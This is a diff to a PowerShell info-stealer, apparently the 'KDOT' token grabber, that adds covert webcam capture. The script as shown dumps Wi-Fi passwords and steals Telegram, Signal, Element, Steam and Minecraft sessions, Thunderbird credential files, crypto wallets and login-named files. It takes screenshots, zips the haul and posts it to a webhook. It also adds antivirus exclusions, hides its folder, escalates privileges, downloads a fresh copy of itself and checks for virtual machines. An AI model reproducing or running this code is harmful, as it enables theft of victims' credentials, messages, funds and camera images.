@@ -1,5 +1,5 @@
-$ErrorActionPreference = 'SilentlyContinue' # Ignore all warnings
-$ProgressPreference = 'SilentlyContinue' # Hide all Progresses
+#$ErrorActionPreference = 'SilentlyContinue' # Ignore all warnings
+#$ProgressPreference = 'SilentlyContinue' # Hide all Progresses
 
 # Single Instance (no overloads)
 function MUTEX-CHECK {
@@ -43,48 +43,48 @@ function EXFILTRATE-DATA {
     $username = $env:USERNAME
     $hostname = $env:COMPUTERNAME
     $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
-	$mfg = (gwmi win32_computersystem).Manufacturer 
-	
-	# System Uptime
-	function Get-Uptime {
+    $mfg = (gwmi win32_computersystem).Manufacturer 
+    
+    # System Uptime
+    function Get-Uptime {
         $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
         $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
         $uptimedata
     }
     $uptime = Get-Uptime
-	
-	# List of Installed AVs
-	function get-installed-av {
+    
+    # List of Installed AVs
+    function get-installed-av {
         $wmiQuery = "SELECT * FROM AntiVirusProduct"
         $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters 
         $AntivirusProduct.displayName 
     }
     $avlist = get-installed-av -autosize | ft | out-string
     
-	# Extracts all Wifi Passwords
+    # Extracts all Wifi Passwords
     $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
     $wifi = $wifipasslist | out-string 
     $wifi > $env:temp\WIFIPasswords.txt
-	
-	# Screen Resolution
+    
+    # Screen Resolution
     $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[0]
     $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[2]  
     $split = "x"
     $screen = "$width" + "$split" + "$height"  
     $screen
     
-	# Startup Apps , Running Services, Processes, Installed Applications, and Network Adapters
-	function misc {
+    # Startup Apps , Running Services, Processes, Installed Applications, and Network Adapters
+    function misc {
         Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $env:temp\StartUpApps.txt
         Get-WmiObject win32_service |? State -match "running" | select Name, DisplayName, PathName, User | sort Name | ft -wrap -autosize >  $env:LOCALAPPDATA\Temp\running-services.txt
         Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | ft -wrap -autosize > $env:temp\running-applications.txt
         Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $env:temp\Installed-Applications.txt
         Get-NetAdapter | ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $env:temp\NetworkAdapters.txt
-	}
-	misc 
-	
+    }
+    misc 
+    
     # Telegram Session Stealer
-	function telegramstealer {
+    function telegramstealer {
         $processName = "telegram"
         try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
         $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
@@ -94,8 +94,8 @@ function EXFILTRATE-DATA {
         Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest
     }
     telegramstealer 
-	
-	# Element Session Stealer
+    
+    # Element Session Stealer
     function elementstealer {
         $processName = "element"
         try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
@@ -111,8 +111,8 @@ function EXFILTRATE-DATA {
         Compress-Archive -Path $element_session -DestinationPath $element_zip -CompressionLevel Fastest
     }
     elementstealer 
-	
-	# Signal Session Stealer
+    
+    # Signal Session Stealer
     function signalstealer {
         $processName = "signal"
         try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
@@ -130,7 +130,7 @@ function EXFILTRATE-DATA {
     signalstealer 
 
     # Steam Session Stealer
-	function steamstealer {
+    function steamstealer {
         $processName = "steam"
         try {if (Get-Process $processName ) {Get-Process -Name $processName | Stop-Process }} catch {}
         $steam_session = "$env:localappdata\temp\steam-session"
@@ -145,8 +145,8 @@ function EXFILTRATE-DATA {
         Compress-Archive -Path $steam_session -DestinationPath $steam_zip -CompressionLevel Fastest
     }
     steamstealer 
-	
-	# Minecraft Session Stealer
+    
+    # Minecraft Session Stealer
     function minecraftstealer {
             $minecraft_session = "$env:localappdata\temp\minecraft-session"
             New-Item -ItemType Directory -Force -Path $minecraft_session
@@ -158,8 +158,8 @@ function EXFILTRATE-DATA {
             Compress-Archive -Path $minecraft_session -DestinationPath $minecraft_zip -CompressionLevel Fastest
     }
     minecraftstealer 
-	
-	# Desktop screenshot
+    
+    # Desktop screenshot
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
     $screens = [Windows.Forms.Screen]::AllScreens
     $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
@@ -173,8 +173,8 @@ function EXFILTRATE-DATA {
     $bmp.Save("$env:localappdata\temp\desktop-screenshot.png")
     $graphics.Dispose()
     $bmp.Dispose()
-	
-	# Disk Information
+    
+    # Disk Information
     function diskdata {
         $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2"
         $results = foreach ($disk in $disks) {
@@ -183,7 +183,7 @@ function EXFILTRATE-DATA {
                 $FreeSpace = [math]::round($disk.FreeSpace/1GB, 0)
                 $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
                 [int]$FreePercent = ($FreeSpace/$SizeOfDisk) * 100
-	    		[int]$usedpercent = ($usedspace/$SizeOfDisk) * 100
+                [int]$usedpercent = ($usedspace/$SizeOfDisk) * 100
                 [PSCustomObject]@{
                     Drive = $disk.Name
                     Name = $disk.VolumeName
@@ -198,7 +198,7 @@ function EXFILTRATE-DATA {
     $alldiskinfo = diskdata
     $alldiskinfo > $env:temp\DiskInfo.txt
     
-	#Extracts Product Key
+    #Extracts Product Key
     function Get-ProductKey {
         try {
             $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
@@ -210,23 +210,23 @@ function EXFILTRATE-DATA {
         }
     }
     
-    Get-ProductKey > $env:localappdata\temp\ProductKey.txt	
-	
-	# Create temporary directory to store wallet data for exfiltration
-	New-Item -Path "$env:localappdata\Temp" -Name "Crypto Wallets" -ItemType Directory -force | out-null
-	$crypto = "$env:localappdata\Temp\Crypto Wallets"
-	
-	
-	New-Item -Path "$env:localappdata\Temp" -Name "Email Clients" -ItemType Directory -force | out-null
+    Get-ProductKey > $env:localappdata\temp\ProductKey.txt    
+    
+    # Create temporary directory to store wallet data for exfiltration
+    New-Item -Path "$env:localappdata\Temp" -Name "Crypto Wallets" -ItemType Directory -force | out-null
+    $crypto = "$env:localappdata\Temp\Crypto Wallets"
+    
+    
+    New-Item -Path "$env:localappdata\Temp" -Name "Email Clients" -ItemType Directory -force | out-null
     $emailclientsfolder = "$env:localappdata\Temp\Email Clients"
-	
+    
     # Thunderbird Exfil
     $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
     If (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
     New-Item -Path "$emailclientsfolder\Thunderbird" -ItemType Directory | Out-Null
     Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$emailclientsfolder\Thunderbird" -Recurse -Force
     }
-	
+    
     # Crypto Wallets
     
     If (Test-Path -Path "$env:userprofile\AppData\Roaming\Armory") {
@@ -267,7 +267,7 @@ function EXFILTRATE-DATA {
     New-Item -Path "$crypto\exodus.wallet" -ItemType Directory | Out-Null
     Get-ChildItem "$env:userprofile\AppData\Roaming\exodus.wallet" -Recurse | Copy-Item -Destination "$crypto\exodus.wallet" -Recurse -Force
     }
-	If (Test-Path -Path "$env:userprofile\AppData\Roaming\Guarda") {
+    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Guarda") {
     New-Item -Path "$crypto\Guarda" -ItemType Directory | Out-Null
     Get-ChildItem "$env:userprofile\AppData\Roaming\Guarda\IndexedDB" -Recurse | Copy-Item -Destination "$crypto\Guarda" -Recurse -Force
     }
@@ -289,9 +289,9 @@ function EXFILTRATE-DATA {
     }
 
     #Files Grabber 
-	New-Item -Path "$env:localappdata\Temp" -Name "Files Grabber" -ItemType Directory -force | out-null
-	$filegrabber = "$env:localappdata\Temp\Files Grabber"
-	Function GrabFiles {
+    New-Item -Path "$env:localappdata\Temp" -Name "Files Grabber" -ItemType Directory -force | out-null
+    $filegrabber = "$env:localappdata\Temp\Files Grabber"
+    Function GrabFiles {
         $grabber = @(
             "account",
             "login",
@@ -361,7 +361,7 @@ function EXFILTRATE-DATA {
                         "name" = ":bust_in_silhouette: User Information"
                         "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````"
                     },
-					@{
+                    @{
                         "name" = ":shield: Antivirus"
                         "value" = "``````$avlist``````"
                     },
@@ -384,9 +384,17 @@ function EXFILTRATE-DATA {
 
     $payload = $embed_and_body | ConvertTo-Json -Depth 10
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
-	
-	# Screenshot Embed
-	curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\desktop-screenshot.png\`"" $webhook | out-null
+
+    Get-WebCamImage
+
+    curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\out0.jpg\`"" $webhook | out-null
+
+    $items = Get-ChildItem -Path $env:localappdata\temp\ -Filter out*.jpg
+    foreach ($item in $items) {
+        $name = $item.Name
+        curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$env:localappdata\temp\$name\`"" $webhook | out-null
+        Remove-Item $item
+    }
 
     Set-Location $env:LOCALAPPDATA\Temp
 
@@ -437,24 +445,197 @@ function EXFILTRATE-DATA {
     Move-Item -Path "$extracted\StartUpApps.txt" -Destination "$extracted\KDOT\StartUpApps.txt" 
     Move-Item -Path "$extracted\running-services.txt" -Destination "$extracted\KDOT\running-services.txt" 
     Move-Item -Path "$extracted\running-applications.txt" -Destination "$extracted\KDOT\running-applications.txt" 
-	Move-Item -Path "$extracted\telegram-session.zip" -Destination "$extracted\KDOT\telegram-session.zip" 
-	Move-Item -Path "$extracted\element-session.zip" -Destination "$extracted\KDOT\element-session.zip" 
-	Move-Item -Path "$extracted\signal-session.zip" -Destination "$extracted\KDOT\signal-session.zip" 
-	Move-Item -Path "$extracted\steam-session.zip" -Destination "$extracted\KDOT\steam-session.zip" 
-	Move-Item -Path "Files Grabber" -Destination "$extracted\KDOT\Files Grabber" 
-	Move-Item -Path "Crypto Wallets" -Destination "$extracted\KDOT\Crypto Wallets" 
-	Move-Item -Path "Email Clients" -Destination "$emailclientsfolder\KDOT\Email Clients" 
+    Move-Item -Path "$extracted\telegram-session.zip" -Destination "$extracted\KDOT\telegram-session.zip" 
+    Move-Item -Path "$extracted\element-session.zip" -Destination "$extracted\KDOT\element-session.zip" 
+    Move-Item -Path "$extracted\signal-session.zip" -Destination "$extracted\KDOT\signal-session.zip" 
+    Move-Item -Path "$extracted\steam-session.zip" -Destination "$extracted\KDOT\steam-session.zip" 
+    Move-Item -Path "Files Grabber" -Destination "$extracted\KDOT\Files Grabber" 
+    Move-Item -Path "Crypto Wallets" -Destination "$extracted\KDOT\Crypto Wallets" 
+    Move-Item -Path "Email Clients" -Destination "$emailclientsfolder\KDOT\Email Clients" 
     Compress-Archive -Path "$extracted\KDOT" -DestinationPath "$extracted\KDOT.zip" -Force
     curl.exe -X POST -F 'payload_json={\"username\": \"POWERSHELL GRABBER\", \"content\": \"\", \"avatar_url\": \"https://i.postimg.cc/m2SSKrBt/Logo.gif\"}' -F "file=@$extracted\KDOT.zip" $webhook
     Remove-Item "$extracted\KDOT.zip"
     Remove-Item "$extracted\KDOT" -Recurse
-	Remove-Item "$filegrabber\Files Grabber" -recurse -force
-	Remove-Item "$crypto\Crypto Wallets" -recurse -force
-	Remove-Item "$extracted\element-session" -recurse -force
-	Remove-Item "$extracted\signal-session" -recurse -force
-	Remove-Item "$extracted\steam-session" -recurse -force
-	Remove-Item "$emailclientsfolder\Email Clients" -recurse -force
+    Remove-Item "$filegrabber\Files Grabber" -recurse -force
+    Remove-Item "$crypto\Crypto Wallets" -recurse -force
+    Remove-Item "$extracted\element-session" -recurse -force
+    Remove-Item "$extracted\signal-session" -recurse -force
+    Remove-Item "$extracted\steam-session" -recurse -force
+    Remove-Item "$emailclientsfolder\Email Clients" -recurse -force
     Remove-Item "$extracted\main.exe"
+}
+
+function Get-WebCamImage { 
+    $source=@" 
+    using System; 
+    using System.Collections.Generic; 
+    using System.Text; 
+    using System.Collections; 
+    using System.Runtime.InteropServices; 
+    using System.ComponentModel; 
+    using System.Data; 
+    using System.Drawing; 
+    using System.Windows.Forms; 
+    
+    namespace WebCamLib 
+    { 
+        public class Device 
+        { 
+            private const short WM_CAP = 0x400; 
+            private const int WM_CAP_DRIVER_CONNECT = 0x40a; 
+            private const int WM_CAP_DRIVER_DISCONNECT = 0x40b; 
+            private const int WM_CAP_EDIT_COPY = 0x41e; 
+            private const int WM_CAP_SET_PREVIEW = 0x432; 
+            private const int WM_CAP_SET_OVERLAY = 0x433; 
+            private const int WM_CAP_SET_PREVIEWRATE = 0x434; 
+            private const int WM_CAP_SET_SCALE = 0x435; 
+            private const int WS_CHILD = 0x40000000; 
+            private const int WS_VISIBLE = 0x10000000; 
+    
+            [DllImport("avicap32.dll")] 
+            protected static extern int capCreateCaptureWindowA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpszWindowName, 
+                int dwStyle, int x, int y, int nWidth, int nHeight, int hWndParent, int nID); 
+    
+            [DllImport("user32", EntryPoint = "SendMessageA")] 
+            protected static extern int SendMessage(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.AsAny)] object lParam); 
+    
+            [DllImport("user32")] 
+            protected static extern int SetWindowPos(int hwnd, int hWndInsertAfter, int x, int y, int cx, int cy, int wFlags); 
+    
+            [DllImport("user32")] 
+            protected static extern bool DestroyWindow(int hwnd); 
+                    
+            int index; 
+            int deviceHandle; 
+    
+            public Device(int index) 
+            { 
+                this.index = index; 
+            } 
+    
+            private string _name; 
+    
+            public string Name 
+            { 
+                get { return _name; } 
+                set { _name = value; } 
+            } 
+    
+            private string _version; 
+    
+            public string Version 
+            { 
+                get { return _version; } 
+                set { _version = value; } 
+            } 
+    
+            public override string ToString() 
+            { 
+                return this.Name; 
+            } 
+    
+            public void Init(int windowHeight, int windowWidth, int handle) 
+            { 
+                string deviceIndex = Convert.ToString(this.index); 
+                deviceHandle = capCreateCaptureWindowA(ref deviceIndex, WS_VISIBLE | WS_CHILD, 0, 0, windowWidth, windowHeight, handle, 0); 
+    
+                if (SendMessage(deviceHandle, WM_CAP_DRIVER_CONNECT, this.index, 0) > 0) 
+                { 
+                    SendMessage(deviceHandle, WM_CAP_SET_SCALE, -1, 0); 
+                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEWRATE, 0x42, 0); 
+                    SendMessage(deviceHandle, WM_CAP_SET_PREVIEW, -1, 0); 
+                    SetWindowPos(deviceHandle, 1, 0, 0, windowWidth, windowHeight, 6); 
+                } 
+            } 
+    
+            public void ShowWindow(global::System.Windows.Forms.Control windowsControl) 
+            { 
+                Init(windowsControl.Height, windowsControl.Width, windowsControl.Handle.ToInt32());                         
+            } 
+            
+            public void CopyC() 
+            { 
+                SendMessage(this.deviceHandle, WM_CAP_EDIT_COPY, 0, 0);          
+            } 
+    
+            public void Stop() 
+            { 
+                SendMessage(deviceHandle, WM_CAP_DRIVER_DISCONNECT, this.index, 0); 
+                DestroyWindow(deviceHandle); 
+            } 
+        } 
+        
+        public class DeviceManager 
+        { 
+            [DllImport("avicap32.dll")] 
+            protected static extern bool capGetDriverDescriptionA(short wDriverIndex, 
+                [MarshalAs(UnmanagedType.VBByRefStr)]ref String lpszName, 
+            int cbName, [MarshalAs(UnmanagedType.VBByRefStr)] ref String lpszVer, int cbVer); 
+    
+            static ArrayList devices = new ArrayList(); 
+    
+            public static Device[] GetAllDevices() 
+            { 
+                String dName = "".PadRight(100); 
+                String dVersion = "".PadRight(100); 
+    
+                for (short i = 0; i < 10; i++) 
+                { 
+                    if (capGetDriverDescriptionA(i, ref dName, 100, ref dVersion, 100)) 
+                    { 
+                        Device d = new Device(i); 
+                        d.Name = dName.Trim(); 
+                        d.Version = dVersion.Trim(); 
+                        devices.Add(d);                     
+                    } 
+                } 
+    
+                return (Device[])devices.ToArray(typeof(Device)); 
+            } 
+    
+            public static Device GetDevice(int deviceIndex) 
+            { 
+                return (Device)devices[deviceIndex]; 
+            } 
+        } 
+    } 
+"@ 
+
+    Add-Type -AssemblyName System.Drawing  
+    $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |   
+    Where-Object { $_.FormatDescription -eq "JPEG" }  
+        
+    Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms, System.Data, System.Drawing  | Out-Null
+
+
+    try {
+        #region Import the Assemblies 
+        [reflection.assembly]::loadwithpartialname("System.Windows.Forms") | Out-Null 
+        [reflection.assembly]::loadwithpartialname("System.Drawing") | Out-Null 
+        #endregion 
+        $picCapture = New-Object System.Windows.Forms.PictureBox 
+        
+        try {
+            $devices = [WebCamLib.DeviceManager]::GetAllDevices()
+        } catch {
+            Write-Host "No camera found"
+            exit
+        }
+        $count = 0
+        foreach ($device in $devices) {
+            $imagePath = "$env:localappdata\temp\out$count.jpg"
+            $device.ShowWindow($picCapture)
+            $device.CopyC()
+            $bitmap = [Windows.Forms.Clipboard]::GetImage()
+            $bitmap.Save($imagePath, $jpegCodec, $ep)
+            $bitmap.dispose()
+            $count++
+        }
+
+    } catch {
+            Write-Host "No camera found"
+            exit
+        }
 }
 
 $webhook = "YOUR_WEBHOOK_HERE"
@@ -463,12 +644,12 @@ function Invoke-TASKS {
     Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\Temp"
     Add-MpPreference -ExclusionPath "$env:APPDATA\KDOT"
     New-Item -ItemType Directory -Path "$env:APPDATA\KDOT" -Force
-	
-	# Hidden Directory
-	$KDOT_DIR=get-item "$env:APPDATA\KDOT" -Force
+    
+    # Hidden Directory
+    $KDOT_DIR=get-item "$env:APPDATA\KDOT" -Force
     $KDOT_DIR.attributes="Hidden","System"
     
-	#$origin = $PSCommandPath
+    #$origin = $PSCommandPath
     #Copy-Item -Path $origin -Destination "$env:APPDATA\KDOT\KDOT.ps1" -Force
     #download new grabber
     (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.ps1", "$env:APPDATA\KDOT\KDOT.ps1")
@@ -490,7 +671,7 @@ function Request-Admin {
     while(!(CHECK_IF_ADMIN)) {
         try {
             Start-Process "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle hidden -File `"$PSCommandPath`"" -Verb RunAs
-            exit 0
+            exit
         }
         catch {}
     }
@@ -522,12 +703,12 @@ function Invoke-ANTITOTAL {
             
             if ($output -eq $true) {
                 Write-Host "Closing the app..."
-                Exit 1
+                exit
             }
         }
         else {
             Write-Host "Failed to retrieve content from URL: $url"
-            Exit 1
+            exit
         }
     }
     Invoke-ANTIVM
@@ -634,7 +815,7 @@ function Invoke-ANTIVM {
     }
     else { 
         Write-Output "Detected processes: $($detectedProcesses -join ', ')"
-        Exit 1
+        Exit
     }
 }
 
@@ -653,10 +834,10 @@ function Hide-Console
 }
 
 if (CHECK_IF_ADMIN -eq $true) {
-    Hide-Console
+    #Hide-Console
     MUTEX-CHECK
     # Self-Destruct
-	# Remove-Item $PSCommandPath -Force 
+    # Remove-Item $PSCommandPath -Force 
 } else {
     Write-Host ("Please run as admin!") -ForegroundColor Red
     Start-Sleep -s 1
